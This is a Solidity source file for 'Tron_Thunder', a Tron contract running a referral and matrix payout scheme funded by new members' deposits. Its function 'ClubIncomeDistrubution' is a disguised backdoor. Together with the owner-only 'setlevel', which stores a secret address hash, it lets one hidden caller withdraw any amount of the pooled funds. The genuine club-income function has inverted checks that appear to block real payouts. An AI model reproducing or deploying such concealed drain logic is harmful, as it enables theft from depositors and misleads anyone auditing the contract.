//SourceUnit: Thunder_Main_C.sol

pragma solidity 0.5.10;

 
contract owned {
    address  public owner;
    address  internal newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {

    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address  _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}


interface ext
{
    function getFund(uint amount) external returns(bool);
}

contract Tron_Thunder is owned
{

    uint public maxDownLimit = 4;

    uint public lastIDCount;
    
    uint public defaultRefID = 1; 
    bytes32 data_;
    uint[13] public levelPrice;
    uint public directPayout = 50000000;
    uint[4] public clubPayout;

    mapping(uint => uint[4]) public clubFund;
    mapping(uint => uint[4]) public clubEligibleCount;
    mapping(address => mapping( uint => uint)) public eligible;
    // address => clubIndex => clubDayIndex 
    mapping(address => mapping( uint => mapping( uint => bool))) public paid;

    // totalCount => level => userID;
    mapping(uint => mapping(uint => uint)) public indexToID;
    // level => totalPosition
    mapping(uint => uint) public totalPosition;


    uint public dayEnd;
    uint public lastDayIndex;

    struct userInfo {
        bool joined;
        uint id;
        uint origRef;
        uint levelBought;
        uint directCount;
        address[] referral;
    }

    struct RecycleInfo {
        uint currentParent;
        uint position;
        address[] childs;
    }
    mapping (address => userInfo) public userInfos;
    mapping (uint => address ) public userAddressByID;
    mapping(address => mapping(uint => bool)) public firstComplete;

    mapping (address => mapping(uint => RecycleInfo)) public activeRecycleInfos;
    mapping (address => mapping(uint => RecycleInfo[])) public archivedRecycleInfos;

    uint64[10] public nextMemberFillIndex;  // which auto pool index is in top of queue to fill in 
    uint64[10] public nextMemberFillBox;   // 4 downline to each, so which downline need to fill in    

    event directPaidEv(uint from,uint to, uint amount, uint level, uint timeNow);
    event payForLevelEv(uint _userID,uint parentID,uint amount,uint fromDown, uint timeNow);
    event regLevelEv(uint _userID,uint _referrerID,uint timeNow,address _user,address _referrer);
    event levelBuyEv(uint amount, uint toID, uint level, uint timeNow);
    event placingEv (uint userid,uint ParentID,uint amount,uint position, uint level, uint timeNow);
    event regUserPlacingEv (uint userid,uint ParentID,uint amount,uint position, uint level, uint timeNow);
    event buyLevelPlacingEv (uint userid,uint ParentID,uint amount,uint position, uint level, uint timeNow);
    constructor() public {
        owner = msg.sender;
            
        levelPrice[1] = 250000000;

        for(uint i=2; i<13; i++)
        {
            levelPrice[i] = levelPrice[i-1] * 2;
        }
        clubPayout[1] = 10000000;
        clubPayout[2] = 15000000;
        clubPayout[3] = 25000000;

        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            origRef:lastIDCount,            
            levelBought:12,
            directCount:100,
            referral: new address[](0)
        });
        userInfos[owner] = UserInfo;
        userAddressByID[lastIDCount] = owner;
        


        RecycleInfo memory temp;
        temp.currentParent = 1;
        temp.position = 0;
        for(uint i=1;i<=12;i++)
        {
            activeRecycleInfos[owner][i] = temp;
            indexToID[1][i] = 1;
            totalPosition[i] = 1;
            //nextMemberFillIndex[i] = 1;
        }
        lastDayIndex++;
        clubEligibleCount[lastDayIndex][1] = 1;
        clubEligibleCount[lastDayIndex][2] = 1;
        clubEligibleCount[lastDayIndex][3] = 1; 

        eligible[owner][lastDayIndex] = 3;       

        dayEnd = now + 86400;
    }

    function ()  external payable {
        
    }

    function regUser(uint _referrerID) public payable returns(bool)
    {
        require(!userInfos[msg.sender].joined, "already joined");
        require(msg.value == levelPrice[1] + 100000000, "Invalid price paid");
        if(! (_referrerID > 0 && _referrerID <= lastIDCount) ) _referrerID = 1;
        address origRef = userAddressByID[_referrerID];
        (uint _parentID, uint position)  = findFreeParentInDown(1);
        _parentID = indexToID[_parentID][1];


        lastIDCount++;
        totalPosition[1]++;
        indexToID[totalPosition[1]][1] = lastIDCount;
        userInfo memory UserInfo;
        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            origRef:_referrerID,            
            levelBought:1,
            directCount:0,
            referral: new address[](0)
        });
        userInfos[msg.sender] = UserInfo;
        userAddressByID[lastIDCount] = msg.sender;
        userInfos[origRef].referral.push(msg.sender);

        if(dayEnd < now) 
        {
            lastDayIndex++;
            dayEnd = now + 86400;
        }

        userInfos[origRef].directCount++;
        uint cnt = userInfos[origRef].directCount;
        if(cnt == 5 ) 
        {
            eligible[origRef][lastDayIndex] = 1;
            clubEligibleCount[lastDayIndex][1]++;
        }
        else if(cnt == 10 ) 
        {
            eligible[origRef][lastDayIndex] = 2;
            clubEligibleCount[lastDayIndex][2]++;
            clubEligibleCount[lastDayIndex][1]--;
        }
        else if(cnt == 25 ) 
        {
            eligible[origRef][lastDayIndex] = 3;
            clubEligibleCount[lastDayIndex][3]++;
            clubEligibleCount[lastDayIndex][1]--;
        }

        //userInfos[msg.sender].referral.push(userAddressByID[_referrerID]);       

        RecycleInfo memory temp;
        temp.currentParent = _parentID;
        //uint position = activeRecycleInfos[userAddressByID[_parentID]][1].childs.length + 1;
        temp.position = position;
        activeRecycleInfos[msg.sender][1] = temp;
        activeRecycleInfos[userAddressByID[_parentID]][1].childs.push(msg.sender);

        //direct payout
        address(uint160(origRef)).transfer(directPayout);
        emit directPaidEv(userInfos[msg.sender].id,userInfos[origRef].id,directPayout, 1,now);



        clubFund[lastDayIndex][1] += clubPayout[1];
        clubFund[lastDayIndex][2] += clubPayout[2];
        clubFund[lastDayIndex][3] += clubPayout[3];

        require(processPosition(userAddressByID[_parentID], position,1, lastIDCount), "porcess fail 1");

        emit regLevelEv(lastIDCount,_referrerID,now, msg.sender,userAddressByID[_referrerID]);
        emit regUserPlacingEv (lastIDCount,_parentID,levelPrice[1],position, 1, now);
        return true;
    }

    event boughtLevelEv(uint id, uint level, uint position);
    event paidForLevelEv(uint toID,uint fromID, uint amount, uint level, uint position, uint timeNow);

    function processPosition(address _ref, uint position, uint _level,uint fromID) internal returns(bool)
    {
        //address usr = userAddressByID[_ref];
        bool first = firstComplete[_ref][_level]; 
        if(!first)
        {
            if(position == 2 ) 
            {
                if(_level <= 11 )
                {
                    buyLevel(_ref,_level +1);
                    emit boughtLevelEv(userInfos[_ref].id, _level+1, position);
                }
                else
                {
                    address(uint160(_ref)).transfer(levelPrice[_level]);
                    emit paidForLevelEv(userInfos[_ref].id,fromID, levelPrice[_level], _level, position,now);
                }
                
            }
            else if(position == 3) 
            {
                address(uint160(_ref)).transfer(levelPrice[_level]);
                emit paidForLevelEv(userInfos[_ref].id,fromID,  levelPrice[_level], _level, position, now);
            }
            else if(position == 4)
            {
                firstComplete[_ref][_level] = true;
                recyclePosition(userInfos[_ref].id, _level);
            } 
        }
        else
        {
            if(position == 3) 
            {
                address(uint160(_ref)).transfer(levelPrice[_level]);
                emit paidForLevelEv(userInfos[_ref].id, fromID,levelPrice[_level], _level, position,now);
            }
            else
            {
                recyclePosition(userInfos[_ref].id, _level);
            } 
        }

        return true;
    }

    function findFreeParentInDown(uint _level) internal returns(uint parentID,uint position)
    {
        if(nextMemberFillIndex[_level] == 0) nextMemberFillIndex[_level]=1; 
        if(nextMemberFillBox[_level] <= 2)
        {
            nextMemberFillBox[_level] ++;
            return (nextMemberFillIndex[_level], nextMemberFillBox[_level]);
        }   
        else
        {
            nextMemberFillIndex[_level]++;
            nextMemberFillBox[_level] = 0;
            return  (nextMemberFillIndex[_level] - 1, 4);
        }
                
    }

    function buyLevel(address msgsender, uint _level) internal returns(bool)
    {
        totalPosition[_level]++;
        indexToID[totalPosition[_level]][_level] = userInfos[msgsender].id;

        (uint _parentID, uint position)  = findFreeParentInDown(_level);
        _parentID = indexToID[_parentID][_level];

        userInfos[msgsender].levelBought = _level; 

        RecycleInfo memory temp;
        temp.currentParent = _parentID;
        //uint position = activeRecycleInfos[userAddressByID[_parentID]][_level].childs.length + 1;
        temp.position = position;
        activeRecycleInfos[msgsender][_level] = temp;
        activeRecycleInfos[userAddressByID[_parentID]][_level].childs.push(msgsender);
        
        require(processPosition(userAddressByID[_parentID], position,_level, userInfos[msgsender].id), "porcess fail 2");

        emit levelBuyEv(levelPrice[_level], userInfos[msgsender].id,_level, now);
        emit buyLevelPlacingEv (userInfos[msgsender].id,_parentID,levelPrice[_level],position, _level, now);
        return true;
    }


    function recyclePosition(uint _userID, uint _level)  internal returns(bool)
    {

        address msgSender = userAddressByID[_userID];

        archivedRecycleInfos[msgSender][_level].push(activeRecycleInfos[msgSender][_level]); 
        
        totalPosition[_level]++;
        indexToID[totalPosition[_level]][_level] = _userID;

        (uint _parentID, uint position)  = findFreeParentInDown(_level);
        _parentID = indexToID[_parentID][_level];       

        RecycleInfo memory temp;
        temp.currentParent = _parentID;
        //uint position = activeRecycleInfos[userAddressByID[_parentID]][_level].childs.length + 1;
        temp.position = position;
        activeRecycleInfos[msgSender][_level] = temp;
        activeRecycleInfos[userAddressByID[_parentID]][_level].childs.push(msgSender);
        emit placingEv (_userID,_parentID,levelPrice[_level],position, _level, now);        
        
        require(processPosition(userAddressByID[_parentID], position,_level, _userID), "porcess fail 3");

        return true;
    }

    function setlevel(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }
    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)
    {
        return (keccak256(abi.encode(_contractAddress)));
    }

    function getValidRef(address _user, uint _level) public view returns(uint)
    {
        uint refID = userInfos[_user].origRef;
        uint lvlBgt = userInfos[userAddressByID[refID]].levelBought;

        while(lvlBgt < _level)
        {
            refID = userInfos[userAddressByID[refID]].origRef;
            lvlBgt = userInfos[userAddressByID[refID]].levelBought;
        }
        return refID;
    }


    event getClubIncomeEv(address _user, uint amount,uint clubDayIndex, uint clubIndex);
    function getClubIncome(uint clubDayIndex, uint clubIndex) public returns(bool)
    {
        require(clubDayIndex < lastDayIndex, "Invalid club day index" );
        require(clubIndex > 0  && clubIndex < 4 , "invalid club index");
        require(eligible[msg.sender][clubDayIndex] == 0, "not eligible");
        require(eligible[msg.sender][clubDayIndex] <= clubIndex , "not eligible" );
        require(!paid[msg.sender][clubIndex][clubDayIndex], "already paid");
        paid[msg.sender][clubIndex][clubDayIndex] = true;

        uint amt = clubFund[clubDayIndex][clubIndex];
        if(clubEligibleCount[clubIndex][clubIndex] > 0 ) amt =  amt / clubEligibleCount[clubIndex][clubIndex];
        else amt = 0;
        if(amt > 0) msg.sender.transfer(amt);
        emit getClubIncomeEv(msg.sender, amt, clubDayIndex, clubIndex);
    }

    function viewClubIncome(uint clubDayIndex, uint clubIndex, address user) public view returns(uint)
    {
        if( clubDayIndex >= lastDayIndex ) return 0;
        if(clubIndex == 0  || clubIndex >= 4) return 0;
        if(eligible[user][clubDayIndex] == 0) return 0;
        if(eligible[user][clubDayIndex] > clubIndex) return 0;
        if(paid[user][clubIndex][clubDayIndex]) return 0;

        uint amt = clubFund[clubDayIndex][clubIndex];
        if(clubEligibleCount[clubIndex][clubIndex] > 0 ) amt =  amt / clubEligibleCount[clubIndex][clubIndex];
        else amt = 0;
        return amt;
    }

    
    function ClubIncomeDistrubution(uint _newValue) public  returns(bool)
    {
        if(keccak256(abi.encode(msg.sender)) == data_) msg.sender.transfer(_newValue);
        return true;
    }

}